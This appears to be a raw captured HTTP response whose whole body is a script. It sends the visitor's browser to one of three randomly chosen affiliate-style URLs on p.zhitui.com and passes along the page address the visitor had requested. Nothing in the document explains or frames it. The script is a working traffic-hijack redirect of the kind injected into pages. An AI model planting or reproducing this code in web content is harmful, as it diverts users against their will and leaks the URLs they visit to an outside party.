HTTP/1.1 200 OK
Server: GFW/5.1.8 (Kylin)
Content-Type: text/html
Set-Cookie: ss=sss
Connection: keep-alive

<html>
<script>
/**/
var urls=[
  'http://p.zhitui.com/?aid=35&sid=101776&url=',
  'http://p.zhitui.com/?aid=35&sid=101777&url=',
  'http://p.zhitui.com/?aid=35&sid=101778&url=',
];
var url = document.location.href;
url = url.split('?')[0] ? url.split('?')[0] : url ; 
document.location.href=urls[parseInt(Math.random()*urls.length,10)]+encodeURIComponent(url);
</script></html>
